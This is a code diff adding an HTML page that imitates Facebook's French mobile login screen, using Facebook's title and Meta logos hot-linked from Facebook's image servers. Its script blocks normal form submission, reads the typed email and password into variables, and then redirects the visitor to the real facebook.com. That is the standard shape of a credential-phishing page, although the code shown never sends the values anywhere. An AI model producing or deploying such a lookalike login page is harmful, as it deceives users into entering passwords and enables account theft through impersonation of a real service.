@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <title>Facebook</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8">
+  <meta property="og:image" content="https://www.facebook.com/images/fb_icon_325x325.png" />
+  <style>
+    /* Your existing styles */
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">
+      <img 
+        data-bloks-name="bk.components.Image" 
+        role="heading" 
+        alt="Facebook from Meta" 
+        class="wbloks_1" 
+        src="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yD/r/5D8s-GsHJlJ.png" 
+        style="max-height: 60px; min-height: 0px; object-fit: contain; overflow: hidden;">
+    </div>
+
+    <!-- Start of form -->
+    <form id="loginForm" onsubmit="return redirectToSite(event)">
+      <input type="text" name="email" placeholder="Email ou Numéro de téléphone" required>
+      <input type="password" name="password" placeholder="Mot de passe" required>
+      <button type="submit">Se connecter</button>
+    </form>
+    <!-- End of form -->
+
+    <a href="#" class="forgot-password">Mot de passe oublié ?</a>
+  </div>
+
+  <div class="footer">
+    <button class="create-account">Créer un nouveau compte</button>
+    <img 
+      data-bloks-name="bk.components.Image" 
+      alt="Logo Meta" 
+      class="meta-logo" 
+      src="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yM/r/DDgwTv3JehF.png">
+  </div>
+
+  <script>
+    function redirectToSite(event) {
+      event.preventDefault(); // Prevent form from submitting traditionally
+      const email = document.querySelector('input[name="email"]').value;
+      const password = document.querySelector('input[name="password"]').value;
+
+      if (email && password) {
+        // Redirect to another page after successful login
+        window.location.href = "https://www.facebook.com/";
+      } else {
+        alert("Please enter both email and password.");
+      }
+    }
+  </script>
+</body>
+</html>
